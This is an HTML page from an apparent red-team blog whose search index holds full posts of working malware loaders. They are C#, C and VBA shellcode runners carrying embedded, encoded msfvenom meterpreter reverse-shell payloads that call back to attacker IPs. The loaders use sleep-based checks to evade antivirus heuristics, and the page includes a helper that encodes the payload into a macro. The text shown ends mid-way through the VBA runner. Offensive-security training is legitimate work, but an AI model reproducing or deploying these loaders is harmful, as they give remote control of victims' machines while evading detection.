<!DOCTYPE html>


<html lang="en">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title></title>
 

  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
<body>
    <div class="container"><header>
  <div class="menu">
    <ul>
      <li class="menu-first-child">
        <span>
          [cyberRat@RedTeam]~$
          <span class="blink">
            █
          </span>
        </span>
      </li>
      <li>
        <a href="/">Home</a>
      </li>

    
      <li>
        <a href="/brainbox/">/BrainBox</a>
      </li> 
      <li>
        <a href="/resume/">/Resume</a>
      </li>

    </ul>
  </div>
</header>

<main>
      <ul id="search-results"></ul>

<script>
  window.store = {
    
      "xdev-pureshrunner": {
        "title": "Pure CS-ShellCode Runner",
        "author": "",
        "category": "",
        "content": "All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!###CUSTOM SHELLCODE RUNNERthis can be modified to use uncommon window32 API to replace wel known API’s like VirtualAlloc and CreateThreadusing System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Runtime.InteropServices;namespace ConsoleApp1{    class MyProgram    {        [DllImport(\"kernel32\")]        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);        [DllImport(\"kernel32\", CharSet = CharSet.Ansi)]        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);        [DllImport(\"kernel32.dll\", SetLastError = true)]        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);                [DllImport(\"kernel32.dll\")]        static extern void Sleep(uint dwMilliseconds);        static void Main(string[] args)        {        // sleep delay to bypass some heuritics detection\t\t    DateTime t1 = DateTime.Now;\t\t    Sleep(2000);\t\t    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;\t\t    if (t2 &lt; 1.5)\t\t    {\t\t        return;\t\t    }                // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.66 LPORT=443 -f csharp  [unencoded]            byte[] buf = new byte[679] {            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,            0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,0x18,0x48,            0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,            0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,            0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,            0x40,0x20,0x50,0x49,0x01,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,            0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,            0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,            0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,            0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,            0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,            0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,            0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,            0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,            0x2e,0x36,0x36,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,            0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,            0x00,0x00,0x00,0xff,0xd5,0xe8,0x7e,0x00,0x00,0x00,0x2f,0x4b,0x65,0x70,0x39,            0x73,0x53,0x2d,0x50,0x45,0x56,0x51,0x66,0x2d,0x78,0x37,0x35,0x66,0x65,0x30,            0x7a,0x75,0x51,0x55,0x4e,0x43,0x6e,0x52,0x35,0x32,0x79,0x48,0x54,0x57,0x4d,            0x50,0x65,0x51,0x61,0x33,0x69,0x62,0x66,0x35,0x4f,0x4f,0x57,0x52,0x79,0x56,            0x7a,0x38,0x78,0x73,0x65,0x65,0x53,0x74,0x46,0x45,0x33,0x46,0x36,0x68,0x73,            0x6a,0x54,0x5a,0x44,0x6e,0x61,0x4c,0x51,0x56,0x51,0x4d,0x5a,0x71,0x6f,0x41,            0x77,0x6d,0x69,0x33,0x39,0x6b,0x41,0x43,0x74,0x69,0x30,0x45,0x6b,0x6c,0x61,            0x42,0x6e,0x4e,0x61,0x6f,0x36,0x48,0x68,0x35,0x4e,0x55,0x79,0x72,0x53,0x62,            0x41,0x4e,0x5a,0x6b,0x48,0x30,0x44,0x42,0x61,0x39,0x63,0x63,0x34,0x42,0x46,            0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,            0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,            0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,            0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,            0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,            0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,            0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,            0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,            0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,            0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,            0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,            0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,            0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,            0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,            0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,            0xa2,0x56,0xff,0xd5 };            int size = buf.Length;            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);            Marshal.Copy(buf, 0, addr, size);            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }    }}c# runner with time delay and encoded shellcodeusing System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Runtime.InteropServices;namespace RevhellWIthEnc{    class Program    {        [DllImport(\"kernel32\")]        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);        [DllImport(\"kernel32\", CharSet = CharSet.Ansi)]        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);        [DllImport(\"kernel32.dll\", SetLastError = true)]        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);        static void Main(string[] args)                //Shelcode encoded with Ceaser Shift Cipher         {            byte[] buf = new byte[803] {0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x58, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4f, 0x33, 0xcb, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x4a, 0x8d, 0x54, 0x22, 0x43, 0x53, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x52, 0x8d, 0x4a, 0x1a, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0xe5, 0x58, 0x4f, 0x33, 0xcb, 0x4a, 0x01, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0x43, 0xc3, 0xcb, 0x0f, 0xae, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x43, 0x5a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b, 0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x10, 0x02, 0x02, 0x02, 0x33, 0x3b, 0x34, 0x30, 0x33, 0x38, 0x3a, 0x30, 0x36, 0x3b, 0x30, 0x38, 0x38, 0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xbd, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc, 0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0xfc, 0x02, 0x02, 0x02, 0x31, 0x4b, 0x47, 0x76, 0x76, 0x49, 0x54, 0x58, 0x39, 0x58, 0x51, 0x2f, 0x39, 0x56, 0x4e, 0x72, 0x51, 0x34, 0x58, 0x4d, 0x70, 0x5b, 0x43, 0x50, 0x65, 0x2f, 0x49, 0x45, 0x69, 0x68, 0x72, 0x77, 0x72, 0x5a, 0x68, 0x59, 0x56, 0x5a, 0x74, 0x6b, 0x45, 0x56, 0x75, 0x78, 0x73, 0x4c, 0x7b, 0x32, 0x59, 0x63, 0x54, 0x6a, 0x79, 0x4f, 0x6c, 0x45, 0x2f, 0x50, 0x7a, 0x7b, 0x51, 0x70, 0x6b, 0x64, 0x64, 0x64, 0x61, 0x76, 0x78, 0x34, 0x67, 0x48, 0x6f, 0x4d, 0x69, 0x76, 0x2f, 0x74, 0x4c, 0x6a, 0x72, 0x4b, 0x39, 0x54, 0x64, 0x4b, 0x4b, 0x51, 0x33, 0x59, 0x78, 0x65, 0x68, 0x43, 0x67, 0x44, 0x5c, 0x37, 0x43, 0x77, 0x39, 0x6b, 0x51, 0x63, 0x54, 0x47, 0x3a, 0x45, 0x4f, 0x70, 0x6d, 0x45, 0x75, 0x61, 0x7a, 0x64, 0x59, 0x4d, 0x78, 0x7b, 0x59, 0x37, 0x55, 0x69, 0x67, 0x6a, 0x58, 0x37, 0x63, 0x61, 0x66, 0x4f, 0x37, 0x4d, 0x48, 0x7b, 0x43, 0x43, 0x49, 0x43, 0x61, 0x70, 0x5b, 0x35, 0x56, 0x52, 0x32, 0x4e, 0x79, 0x6b, 0x6c, 0x64, 0x59, 0x75, 0x66, 0x7b, 0x45, 0x71, 0x57, 0x43, 0x64, 0x3a, 0x5a, 0x37, 0x37, 0x7b, 0x38, 0x7c, 0x4e, 0x2f, 0x48, 0x6f, 0x3a, 0x59, 0x70, 0x44, 0x63, 0x6a, 0x4d, 0x38, 0x6a, 0x32, 0x54, 0x32, 0x78, 0x37, 0x4e, 0x61, 0x69, 0x57, 0x77, 0x7c, 0x71, 0x33, 0x37, 0x49, 0x5b, 0x49, 0x69, 0x71, 0x49, 0x6d, 0x6d, 0x67, 0x6d, 0x39, 0x37, 0x69, 0x55, 0x38, 0x5b, 0x66, 0x76, 0x39, 0x4f, 0x67, 0x4b, 0x59, 0x57, 0x59, 0x61, 0x79, 0x6c, 0x54, 0x6a, 0x7c, 0x6e, 0x71, 0x50, 0x4f, 0x35, 0x57, 0x72, 0x39, 0x55, 0x72, 0x3b, 0x66, 0x37, 0x46, 0x69, 0x54, 0x7c, 0x5b, 0x7b, 0x77, 0x76, 0x3a, 0x35, 0x02, 0x4a, 0x8b, 0xc3, 0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x34, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x4a, 0x8b, 0xf3, 0x6c, 0x21, 0x5c, 0x54, 0x6a, 0x82, 0x35, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x6c, 0x06, 0x43, 0x5b, 0x4b, 0xbc, 0x77, 0x48, 0xa0, 0x88, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4f, 0x33, 0xc2, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xac, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c, 0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7 };            //Console.WriteLine(buf.Length);            //Console.ReadLine();            //decryption routine            for (int i = 0; i &lt; buf.Length; i++)            {                buf[i] = (byte)(((uint)buf[i] - 2) &amp; 0xFF);            }            int size = buf.Length;            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);            Marshal.Copy(buf, 0, addr, size);            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }    }}C SHELLCODE RUNNER WITH FORK FUNCTION#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;dlfcn.h&gt;//msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.164 LPORT=443 -f c | then use the XOR helper to encoded it with key \"112\"unsigned char buf[] = \"\\x38\\x41\\x8F\\x1A\\x79\\x28\\xE9\\xC6\\x60\\x38\\xF9\\xA6\\x3D\\x41\\xB9\\x1A\\x52\\x31\\x2A\\xC2\\x77\\x7F\\x75\\x38\\xF5\\xB0\\x08\\x21\\x1A\\x7A\\x31\\x29\\x20\\x1A\\x59\\x28\\xE9\\x1A\\x72\\x2F\\x1A\\x71\\x2E\\x7F\\x75\\x38\\xF5\\xB0\\x08\\x4B\\x38\\xE7\\x38\\xC9\\x72\\x70\\x71\\xCB\\xB0\\xD8\\x41\\xD4\\x21\\x38\\xF9\\x96\\x1A\\x60\\x2A\\x1A\\x5A\\x28\\x7F\\x75\\x29\\x38\\xF5\\xB0\\x09\\x55\\x39\\x8F\\xB9\\x04\\x68\\x27\\x1A\\x53\\x28\\x1A\\x70\\x1A\\x75\\x38\\xF9\\x97\\x38\\x41\\x86\\x7F\\x75\\x29\\x29\\x2F\\x38\\xF5\\xB0\\x09\\xB7\\x1A\\x4C\\x28\\x1A\\x71\\x2F\\x7F\\x75\\x2E\\x1A\\x0E\\x2A\\x7F\\x75\\x38\\xF5\\xB0\\x08\\x9D\\x8F\\x96\\x70\";int main() {    printf(\"I Love Programming.\");        int key = 112;    int buf_len = (int) sizeof(buf);    //Decode Routine    for (int i = 0; i &lt; buf_len; i++)    {        buf[i] = buf[i] ^ key;            }    // Fork a new thread based on the current one    if (fork() == 0)    {        // Execute shellcode in the new thread        intptr_t pagesize = sysconf(_SC_PAGESIZE);        // Make memory executable (required in libs)        if (mprotect((void *)(((intptr_t)buf) &amp; ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {            // Handle error            perror(\"mprotect\");            return -1;        }        // Cast and execute        int (*ret)() = (int(*)())buf;        ret();    }}",
        "url": "/xdev/pureshrunner/"
      }
      ,
    
      "ctf-cysecctf": {
        "title": "CYSEC 2020 CTF",
        "author": "",
        "category": "",
        "content": "CYSEC CyberHackathon CTFCY3ER-R4TINTRODUCTION  END OF PART ONE  The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried",
        "url": "/ctf/cysecctf/"
      }
      ,
    
      "xdev-vbarunner": {
        "title": "Custom VBA-ShellCode Runner",
        "author": "",
        "category": "",
        "content": "All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!###CUSTOM VBA SHELLCODE ENCRYPTER [HELPER] Generate a  vbapplication shellcode with the rat_helper.exe belowusing System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;namespace helper{\tinternal class Program\t{\t\tstatic void Main(string[] args)\t\t{\t\t\tbyte[] buf = new byte[598] {\t\t\t0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,\t\t\t0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,\t\t\t0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,\t\t\t0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,\t\t\t0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,\t\t\t0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,\t\t\t0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,\t\t\t0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,\t\t\t0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,\t\t\t0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,\t\t\t0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,\t\t\t0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x00,0x00,0x00,\t\t\t0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,\t\t\t0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,\t\t\t0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,\t\t\t0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,\t\t\t0x6f,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,\t\t\t0x68,0xbb,0x01,0x00,0x00,0xe8,0x2f,0x01,0x00,0x00,0x2f,0x2d,0x72,0x50,0x4c,\t\t\t0x44,0x55,0x7a,0x71,0x52,0x61,0x52,0x33,0x5a,0x33,0x5a,0x6d,0x46,0x53,0x77,\t\t\t0x54,0x6a,0x67,0x63,0x36,0x43,0x41,0x53,0x4a,0x50,0x39,0x51,0x6d,0x39,0x48,\t\t\t0x57,0x50,0x4c,0x33,0x35,0x77,0x6e,0x4f,0x44,0x51,0x6b,0x45,0x64,0x6d,0x38,\t\t\t0x34,0x4c,0x47,0x54,0x52,0x41,0x39,0x77,0x61,0x33,0x56,0x38,0x67,0x5f,0x4a,\t\t\t0x41,0x53,0x75,0x4f,0x4f,0x48,0x51,0x4b,0x71,0x78,0x5a,0x4c,0x67,0x71,0x59,\t\t\t0x4c,0x65,0x6b,0x53,0x57,0x67,0x62,0x51,0x66,0x4e,0x6f,0x51,0x49,0x32,0x35,\t\t\t0x73,0x72,0x4f,0x37,0x35,0x33,0x4e,0x39,0x47,0x79,0x6f,0x6b,0x4a,0x41,0x6b,\t\t\t0x4c,0x4e,0x79,0x58,0x33,0x74,0x61,0x72,0x66,0x36,0x66,0x31,0x63,0x6a,0x74,\t\t\t0x46,0x48,0x6d,0x46,0x72,0x67,0x41,0x4d,0x4a,0x44,0x35,0x53,0x45,0x63,0x61,\t\t\t0x74,0x6c,0x45,0x43,0x4d,0x6d,0x6b,0x67,0x63,0x71,0x49,0x6d,0x65,0x2d,0x66,\t\t\t0x6e,0x30,0x36,0x4a,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,\t\t\t0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,\t\t\t0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,\t\t\t0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,\t\t\t0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,\t\t\t0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,\t\t\t0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,\t\t\t0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,\t\t\t0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,\t\t\t0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,\t\t\t0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,\t\t\t0x36,0x36,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };\t\t\t// ceaser encoder\t\t\tbyte[] encoded = new byte[buf.Length];\t\t\tfor (int i = 0; i &lt; buf.Length; i++)\t\t\t{\t\t\t\tencoded[i] = (byte)(((uint)buf[i] + 2) &amp; 0xFF);\t\t\t}\t\t\tuint counter = 0;\t\t\t//convert byte array toa string using the String builder class\t\t\tStringBuilder hex = new StringBuilder(encoded.Length * 2);\t\t\tforeach (byte b in encoded)\t\t\t{\t\t\t\thex.AppendFormat(\"{0:D}, \", b);\t\t\t\tcounter++;\t\t\t\tif (counter % 50 == 0)\t\t\t\t{\t\t\t\t\thex.AppendFormat(\"_{0}\", Environment.NewLine);\t\t\t\t}\t\t\t}\t\t\t// print encoded shelllcode to screen\t\t\tConsole.WriteLine(\"The VBA payload is: \" + hex.ToString());\t\t}\t}}Now Input the output of the helper.exe {which is an encrypted reverse shellcode}into the VB shellcode runner belowmsfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplicationPrivate Declare PtrSafe Function CreateThread Lib \"KERNEL32\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtrPrivate Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtrPrivate Declare PtrSafe Function RtlMoveMemory Lib \"KERNEL32\" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtrPrivate Declare PtrSafe Function Sleep Lib \"KERNEL32\" (ByVal mili As Long) As LongFunction MyMacro()\tDim buf As Variant\tDim addr As LongPtr\tDim counter As Long\tDim data As Long\tDim res As Long\tDim t1 As Date\tDim t2 As Date\tDim time As Long\t'sleeper to bypass heuristic detection\tt1 = Now()\tSleep (2000)\tt2 = Now()\ttime = DateDiff(\"s\", t1, t2)\t\tIf time &lt; 2 Then\t\tExit Function\tEnd If'shellcode generated with the helper\tbuf = Array(254, 234, 145, 2, 2, 2, 98, 51, 212, 102, 141, 84, 50, 139, 231, 141, 84, 14, 141, 84, 22, 51, 1, 17, 185, 76, 